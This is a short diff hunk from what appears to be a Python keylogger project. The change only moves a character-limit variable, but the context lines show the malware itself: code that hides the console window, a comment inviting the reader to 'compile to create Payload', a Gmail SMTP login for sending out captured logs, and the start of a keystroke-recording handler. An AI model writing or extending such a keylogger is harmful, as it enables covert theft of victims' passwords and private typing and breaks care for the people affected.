@@ -10,13 +10,13 @@ win32gui.ShowWindow(hide , win32con.SW_HIDE)
 #Enter these details and compile to create Payload
 email = ""
 password = ""
+char_limit = 20
 
 server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
 server.login(email, password)
 
 full_log = ''
 word = ''
-char_limit = 20
 
 #recording keystrokes
 def on_press(key):
